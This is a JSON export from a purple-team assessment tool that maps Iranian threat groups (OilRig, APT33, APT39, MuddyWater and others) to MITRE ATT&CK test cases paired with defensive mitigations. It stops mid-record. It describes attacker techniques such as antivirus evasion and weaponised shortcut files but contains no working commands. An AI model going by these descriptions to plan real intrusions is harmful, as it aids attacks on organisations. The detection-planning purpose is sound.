{"type":"bundle","id":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","spec_version":"2.0","objects":[{"type":"x-vectr-io-assessmentgroup","id":"x-vectr-io-assessmentgroup--e96b6291-3c3f-404a-b9ef-e274dcaf6f94","vectrId":"e96b6291-3c3f-404a-b9ef-e274dcaf6f94","name":"Iranian TTP Bundle","description":"Common Iranian TTPs from US-Cert advisory and known threat actor groups","offset":0,"createTime":1.578492233489E12,"updateTime":1.578573821919E12,"assessmentIds":["7ea0885d-ea9f-48cb-81bc-dd92b988845e","419a551a-9613-4d11-98dc-b788396d073c","f6b39134-e64a-430c-8010-7b4ca8ddd2a7","c45947f0-f51d-4969-981a-c063e3eaa7fa","7a233627-7aac-4b3c-b6b3-1a515182d523","eb1f72ce-785d-4166-a88b-dde615d02b25","5d89c3ba-8868-4a9a-887b-08c7cf68e93d"],"assessmentType":"Campaign","deprecated":false,"deprecationTime":0.0,"tagIds":[],"killChainId":"5cd6bf81-e3f2-4430-ba0c-5288328a20c5","importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-campaign","id":"x-vectr-io-campaign--419a551a-9613-4d11-98dc-b788396d073c","vectrId":"419a551a-9613-4d11-98dc-b788396d073c","name":"OilRig (APT34)","description":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.57857523482E12,"targetAssetIds":[],"expectedDetectionLayerIds":[],"todos":[],"assessmentType":"Campaign","testCaseIds":["0192211d-34a3-4891-a8cd-f48186e4d159","035046a0-28da-42c8-bbdb-31f0c1d724e8","0f2f5ac8-eaa2-4332-8bf3-60ecdc149354","190b2ae7-d56b-4e5e-98de-632e704b9d79","1a442053-fe82-4fcc-b553-471d6bfe470a","20f661a5-3421-4036-88e0-ff423c618f21","2ae04f18-b715-4480-a196-72c64b6dbb80","2b43d5fd-64f9-42d3-8a63-f81f3f163bc0","30cc13ed-680a-4352-a093-a38e616f81b2","31b17735-053e-48aa-a927-c81c3021a3f9","3988cd09-03b3-4736-8783-45262752f8d9","39d21839-f414-490f-8127-4821bfdd63c0","42fe048a-1369-4c1c-b967-bddb9810aa33","438e262a-3956-4b4b-a078-ca8b373e0e08","45034000-9d34-412f-8dec-4a84c13f922f","4526f1ed-fcf3-465d-8107-17579a737c6b","4821ba7e-77b9-44de-9742-207e5824b6cd","562e74cf-7706-4bdb-80a2-04bbea023ddd","640e2742-7072-4018-84b9-529ff01a70c3","661b5f40-5d7d-447c-8fcc-8f0330518a17","7073e478-de10-465e-92f1-3bc5d9e0461b","74d26099-8215-4b4d-9666-55335cd82ab2","7a261492-9225-4f2e-a701-d90fbbb36369","7c84d591-e5b9-4782-91ad-1c0277b59dc7","84ccc036-4973-4307-9eea-e55ba6672ce0","86a3338b-8ce6-4dbc-a986-ce1b0e531d11","877b2c88-f656-4f7c-aed1-62bec99cef1b","8c7894f4-c52a-4e66-ab54-a0e837a0e7ec","9dbc2d02-e30d-404c-a800-f94cbbe59e9a","a273ffd2-52a2-4e58-9648-1086faca3cc6","a92806c4-f7eb-45e1-844b-c3147f1a7468","abce7871-5154-443b-b335-f2f73d35451b","ad166886-0882-43ba-8486-aca3fd00c554","bfe9444d-c84d-4cf8-8565-97fc064a826b","cf2406d8-6223-44ec-81d2-4ca870758129","d25e4869-2389-4d4f-a93d-8f8017c6a05d","d96795c3-7a22-4876-8f98-5d32b02999b3","e8d72781-108d-4a35-9342-7261debfa329","eab6e8ef-693b-4cec-ae19-23ce214368c6","eb69bf56-e5c5-4e41-aa62-d9543d43046a","f588b7aa-62c0-403a-8c37-3fd419a7c557","fdba11cd-2055-4a54-b44b-d7b0a5b36965","ff566be3-1753-4f5d-b44d-8ee6c4a3d83c","ffd0767e-9c9f-4da3-bfca-a2517e34cec5"],"metadata":{"stix_templates":["intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]},"tagIds":[],"deprecated":false,"deprecationTime":0.0,"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"sourceIPIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-campaign","id":"x-vectr-io-campaign--5d89c3ba-8868-4a9a-887b-08c7cf68e93d","vectrId":"5d89c3ba-8868-4a9a-887b-08c7cf68e93d","name":"APT33","description":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"targetAssetIds":[],"expectedDetectionLayerIds":[],"todos":[],"assessmentType":"Campaign","testCaseIds":["0d2a8f98-2a70-4d0f-ac20-61a712cd8dca","16f9e590-f1ae-40d0-bf41-4531b1bbe01c","20f68cab-24bf-4a15-8e45-b4dd82c56cde","2ecb02e3-1f75-4a63-947c-4e20749cc88e","4c750490-533f-4a4e-9692-f972bf3eba64","4f007b9e-ccfd-472b-8a02-47094203d445","5d854213-edf5-482f-8553-0918fe48b055","6620452b-de4e-4fbc-b412-570473888796","66f94e80-7500-4982-973d-d898d1081041","73330084-c72e-4c86-ad5a-a5f7c331d154","749baeab-e35c-4c6f-81ea-443a262920a4","a00f5355-d55d-4939-b4ef-7cae2af33ae8","a62bfd0f-27b2-4842-8f1f-4725eb4fb6bb","a7f60114-a60b-4c67-ab26-1dfbd0a03fcf","b95f6beb-8a88-4b03-b985-38b6c8325a3a","bb8096ee-ae2e-4cd0-a695-7ac55c1eb143","bb93c10d-080c-467b-b7c4-e2de00711f2e","bc4e5a5e-59a3-4af2-b2d7-38156470e7ef","cdb631a7-190e-45a7-98df-0290259809b4","dbc0c5e1-97df-49a3-ae1f-ad7117613ddc","eb0f0b89-d74f-4e96-82d8-757037071d91"],"metadata":{"stix_templates":["intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]},"tagIds":[],"deprecated":false,"deprecationTime":0.0,"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"sourceIPIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-campaign","id":"x-vectr-io-campaign--7a233627-7aac-4b3c-b6b3-1a515182d523","vectrId":"7a233627-7aac-4b3c-b6b3-1a515182d523","name":"APT39","description":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"targetAssetIds":[],"expectedDetectionLayerIds":[],"todos":[],"assessmentType":"Campaign","testCaseIds":["02604086-2109-4bd4-b5c5-a57758443210","053f5440-1039-42e4-833c-a3f11706082f","0c77556a-a676-415f-b074-082f8a599cbd","2e88c6a0-8f84-4b54-8e23-726ca5eebda8","2f3aa0de-aec4-47d9-8203-e9b139f9ad3d","67d252d4-5bba-4178-9577-704956b4ec38","865bdbb6-01af-4b41-81d1-0ececa73d12d","8c27541e-dcbe-4124-a260-280af66b1f59","a049d416-50e4-4e3f-8b0e-0762351ad886","a7d170e9-e5be-488e-aa16-e8823245273d","b59010a2-74e0-4213-8e17-c1031c8e870d","cce40ed8-2905-4ece-99b4-71986c6595f3","d4506dae-2738-47c3-8582-5d5e94f984ed","d74a33c7-633e-449b-8eb8-c0d5c1d80e39","dd31603d-099d-498e-813a-5286b60d8d1f","e1aebb2e-6f07-4018-ab8c-a9908511cb66","e1e76bbe-c4b2-4738-8f20-d55c9c0850b0","ebddbaad-4b66-497e-89fd-142439d98549"],"metadata":{"stix_templates":["intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]},"tagIds":[],"deprecated":false,"deprecationTime":0.0,"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"sourceIPIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-campaign","id":"x-vectr-io-campaign--7ea0885d-ea9f-48cb-81bc-dd92b988845e","vectrId":"7ea0885d-ea9f-48cb-81bc-dd92b988845e","name":"CopyKittens","description":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"targetAssetIds":[],"expectedDetectionLayerIds":[],"todos":[],"assessmentType":"Campaign","testCaseIds":["4459f509-74b3-4b68-8cca-7db67f579186","7b22dfac-430b-4053-9aa2-81b72098eb75","9ce03c18-1fc7-4e0e-80dd-dda6d3b1b7b9","d3ae2751-6155-4d20-9a3e-e1e4bc1bc187","dcffc1f1-2aaa-4eb5-99b3-c55d3bcfbb41","eedb847b-5fdf-47e6-bc71-ab3998c51a9d"],"metadata":{"stix_templates":["intrusion-set--dcd81c6e-ebf7-4a16-93e0-9a97fa49c88a"]},"tagIds":[],"deprecated":false,"deprecationTime":0.0,"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"sourceIPIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-campaign","id":"x-vectr-io-campaign--c45947f0-f51d-4969-981a-c063e3eaa7fa","vectrId":"c45947f0-f51d-4969-981a-c063e3eaa7fa","name":"Collection of Iranian TTPs from US-CERT AA20-006A","description":"Test case coverage for common Iranian techniques outlined in US-CERT advisory - https://www.us-cert.gov/ncas/alerts/aa20-006a","offset":0,"createTime":1.578424092436E12,"updateTime":1.578499751361E12,"targetAssetIds":[],"expectedDetectionLayerIds":[],"todos":[],"assessmentType":"Campaign","testCaseIds":["38a95266-6cda-4905-a5e7-96531e80619f","66090e66-8d9e-4f9a-a2a8-17c6982a9690","6dd6a02b-48a4-4837-876b-493c2df7510d","935f84cb-1c15-4c8f-8808-01f5207c9958","9d2c89c9-89a0-4648-9280-7daf9447b9bf","a4b954c8-e087-42c1-bd94-0957be7d4859","b4ddc49c-9e18-483e-838a-dfcf82be47f4","c7d3193f-2f3a-47bf-83b7-e858ba879036","d1cc8b6f-4b06-49ad-868a-5a8a1c0ec22c","d6dd145b-c7ae-4f79-bc07-179a012a7a07","e151101a-09f5-4756-ab7a-681a50e106d2","ed0d3159-8b00-46b2-b0f6-d91cd001e085","eed6c25f-bbfd-455f-a193-85e4619fa43c","f8712bc6-dde5-41ba-bb98-e7940ef7f061","fd640821-285c-4a9f-9e33-57ed2411beb1"],"metadata":{},"tagIds":[],"deprecated":false,"deprecationTime":0.0,"organizationIds":["f1f60f50-6564-4ce4-a376-4e6d9bac8183","92fa723f-7791-467f-8726-05d34d80f40f","1cf413ba-326a-4d18-979c-367eb1306f69"],"sourceIPIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-campaign","id":"x-vectr-io-campaign--eb1f72ce-785d-4166-a88b-dde615d02b25","vectrId":"eb1f72ce-785d-4166-a88b-dde615d02b25","name":"Magic Hound","description":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"targetAssetIds":[],"expectedDetectionLayerIds":[],"todos":[],"assessmentType":"Campaign","testCaseIds":["180734f8-fbcb-4806-a4ce-eb24e8b9053f","18e70126-c923-4dde-a95e-36b453056db0","1d3c953f-e214-4674-9fd9-091f0aab9572","27bfb2bf-9a13-4478-ad89-bf000aeaaafa","2f063fe2-70c1-4af7-9f12-038ecd1541d4","329d13b9-5a93-4d5d-ad48-a91e0e70d133","3705db78-0dd2-4696-abb0-4047dff98d0d","4b442c7d-ee1f-494d-9339-3ed8fb9c7425","505e1f38-f0f4-47ed-9623-f62924efcdc3","563395f2-fa47-4e62-8228-57597c8b0be5","5d2507a5-e378-4d9f-812d-9f4321f0c74d","64a053d1-c1fc-45b1-9106-180c761a2bba","6919446f-6708-4dc1-86d7-577e6cdd9ddd","6d096d28-7766-4e55-8ff5-4ffffc2faafb","71de1618-2c48-4efb-ae78-d7ce79689915","74348829-cf4c-4399-b614-1d0f22fb8206","7af27c8a-6b6f-4971-85aa-b7edc323fced","88bfefb5-4817-4fcd-83dc-9b21b8b3bfb8","bfa0da58-81d7-426e-8e03-2edbdbe4720f","c1f0bdc1-98f5-4b1c-94fc-c5f704a0b2a1","c5570c4c-4845-478c-8dbf-456690d3faa7","c5735226-a0fc-4158-8f5b-aa6956749cd5","c7e8d98a-fadb-4eb9-a375-99320e49f839","d979d988-8441-4093-b913-e593ba2bdf03","e20255b6-a143-4dea-949a-739438dc8e5b","e3ee3c9e-9650-499b-b3b5-8861b5a31c23","e6f672c4-86f3-4512-89a5-1356ad55d690"],"metadata":{"stix_templates":["intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]},"tagIds":[],"deprecated":false,"deprecationTime":0.0,"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"sourceIPIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-campaign","id":"x-vectr-io-campaign--f6b39134-e64a-430c-8010-7b4ca8ddd2a7","vectrId":"f6b39134-e64a-430c-8010-7b4ca8ddd2a7","name":"MuddyWater","description":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"targetAssetIds":[],"expectedDetectionLayerIds":[],"todos":[],"assessmentType":"Campaign","testCaseIds":["014ade14-a236-444e-8dbe-e546a77abc3c","0d60fc51-83a4-4b3b-89b3-76461616508a","20194b36-e180-436d-a4f2-a61ab152f2de","28e24300-48f3-4e48-a7fe-38f241927ca9","2d553472-cb1b-4d8d-ae68-ab9197bce3ab","3d64be57-aa6c-41d2-9e96-c5ae0ccd3b8b","3da04da9-cac9-4131-8696-e114d9f21913","429df14a-4e41-4006-9b0f-cc53eed671a8","458b4bad-c81c-4b94-98a9-5dbfb752f486","47a87b6f-da68-4bdb-bb76-770ab510721b","4e2a015b-5dd6-4687-ada5-669e1b4d435d","4f8cb780-ad75-4f7f-bd6e-7521dc5e8a9f","5c3f612f-48cd-461b-842a-03e929ec13eb","5e2bbd65-29b7-4b2c-998e-be4936032010","6b1f369b-c979-4ba3-a2b7-e1793b1962be","6c002959-4493-43d6-995b-5d8522623389","6dbe13f5-af60-44aa-bc56-d6a4110a5b09","7ea0c6a7-ad49-4158-8f83-abe043fcf079","936ee652-351e-4867-958d-13351620fbe6","993918e1-562c-40d5-89c6-08aa6beb2db2","9add6e28-32ef-4c6c-ad0a-4c7c89c24164","9b5c9d9e-ca62-44e7-9160-0f149f6ac05c","a0ff239f-7e96-4a30-83f1-7e8ff93d2dbe","a4a28e1c-dce4-4446-a034-6d519d090c84","a7204b51-aa53-43ae-8ab6-84d8583ba422","c3eaa505-9863-4542-bb38-6bd92f5b1a10","c493ba52-17e0-415a-aeed-398cff10c19f","c956f7f1-246d-42fe-a455-edb15664590a","e1554117-5884-4d3a-b11b-3fb497931d20","e3cdbff7-e262-4eb2-bff1-74045eccff11","f22c6ed0-766e-48b0-a373-51e5e640a2b3"],"metadata":{"stix_templates":["intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]},"tagIds":[],"deprecated":false,"deprecationTime":0.0,"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"sourceIPIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--014ade14-a236-444e-8dbe-e546a77abc3c","vectrId":"014ade14-a236-444e-8dbe-e546a77abc3c","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"014ade14-a236-444e-8dbe-e546a77abc3c","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Process Discovery","variant":"MuddyWater - Process Discovery","objective":"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Windows\n\nAn example command that would obtain details on processes is \"tasklist\" using the [Tasklist](https://attack.mitre.org/software/S0057) utility.\n\n### Mac and Linux\n\nIn Mac and Linux, this is accomplished with the <code>ps</code> command.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used malware to obtain a list of running processes on the system.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580","relationship--9f81120a-adde-47cc-95bc-cd8201eb0a11","relationship--03f30a17-095b-4656-a7db-87d98628dfd8","course-of-action--f6469191-1814-4dbe-a081-2a6daf83a10b","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/"],"mitreId":"T1057"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--0192211d-34a3-4891-a8cd-f48186e4d159","vectrId":"0192211d-34a3-4891-a8cd-f48186e4d159","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"0192211d-34a3-4891-a8cd-f48186e4d159","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Windows Management Instrumentation","variant":"OilRig - Windows Management Instrumentation","objective":"Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI 2015)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used WMI for execution.By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI.\n---\nPrevent credential overlap across systems of administrator and privileged accounts.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055","relationship--bd0cff5e-762e-4ba0-ab42-9bfe84e8db4f","relationship--48e6b5fc-9d82-4cdf-84aa-bc23647e1234","course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317","relationship--1e0c4d65-a4db-42e0-9eb0-93354ad56d06","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--a2ee3987-f7c9-41ce-8aca-fae8e8c2ef9a","course-of-action--ba2ec548-fb75-4b8c-88d6-d91a77a943cf","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016. https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf","Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. https://www.brighttalk.com/webcast/10703/296317/apt34-new-targeted-attack-in-the-middle-east","Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016. https://technet.microsoft.com/en-us/library/cc787851.aspx","Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016. https://msdn.microsoft.com/en-us/library/aa394582.aspx","Wikipedia. (2016, June 12). Server Message Block. Retrieved June 12, 2016. https://en.wikipedia.org/wiki/Server_Message_Block"],"mitreId":"T1047"},"blueTeam":{"successfulDetectionBehaviors":["Manage the creation, modification, use, and permissions associated to user accounts.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Disabling WMI or RPCS may cause system instability and should be evaluated to assess the impact to a network. By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts. (Citation: FireEye WMI 2015)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--02604086-2109-4bd4-b5c5-a57758443210","vectrId":"02604086-2109-4bd4-b5c5-a57758443210","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"02604086-2109-4bd4-b5c5-a57758443210","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Shortcut Modification","variant":"APT39 - Shortcut Modification","objective":"Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.","command":"[APT39](https://attack.mitre.org/groups/G0087) has modified LNK shortcuts.Limit permissions for who can create symbolic links in Windows to appropriate groups such as Administrators and necessary groups for virtualization. This can be done through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create symbolic links.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--970cdb5c-02fb-4c38-b17e-d6327cf3c810","relationship--25557d9f-bfa0-4da7-8352-ab56b82b475b","relationship--2482623f-65a7-4da5-8cb2-64279319e3dc","course-of-action--a13e35cc-8c90-4d77-a965-5461042c1612","relationship--869f816b-a02b-453b-9b52-1620ac82412d","course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html"],"mitreId":"T1023"},"blueTeam":{"successfulDetectionBehaviors":["Limit permissions for who can create symbolic links in Windows to appropriate groups such as Administrators and necessary groups for virtualization. This can be done through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create symbolic links. (Citation: UCF STIG Symbolic Links)\n\nIdentify and block unknown, potentially malicious software that may be executed through shortcut modification by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)","Manage the creation, modification, use, and permissions associated to user accounts."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--035046a0-28da-42c8-bbdb-31f0c1d724e8","vectrId":"035046a0-28da-42c8-bbdb-31f0c1d724e8","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"035046a0-28da-42c8-bbdb-31f0c1d724e8","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Indicator Removal from Tools","variant":"OilRig - Indicator Removal from Tools","objective":"If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6","relationship--fb6ffb5c-5405-4515-a120-7a34414933ea","relationship--5978c8e0-8b60-4ad5-8fc9-9fa1ee4d7387","course-of-action--4b998a71-7b8f-4dcc-8f3f-277f2e740271","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Falcone, R., Wilhoit, K.. (2018, November 16). Analyzing OilRig’s Ops Tempo from Testing to Weaponization to Delivery. Retrieved April 23, 2019. https://unit42.paloaltonetworks.com/unit42-analyzing-oilrigs-ops-tempo-testing-weaponization-delivery/","Falcone, R.. (2017, April 27). OilRig Actors Provide a Glimpse into Development and Testing Efforts. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2017/04/unit42-oilrig-actors-provide-glimpse-development-testing-efforts/"],"mitreId":"T1066"},"blueTeam":{"successfulDetectionBehaviors":["Mitigation is difficult in instances like this because the adversary may have access to the system through another channel and can learn what techniques or tools are blocked by resident defenses. Exercising best practices with configuration and security as well as ensuring that proper process is followed during investigation of potential compromise is essential to detecting a larger intrusion through discrete alerts.\n\nIdentify and block potentially malicious software that may be used by an adversary by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--053f5440-1039-42e4-833c-a3f11706082f","vectrId":"053f5440-1039-42e4-833c-a3f11706082f","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"053f5440-1039-42e4-833c-a3f11706082f","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"User Execution","variant":"APT39 - User Execution","objective":"An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. \n\nAs an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A malicious .lnk file may 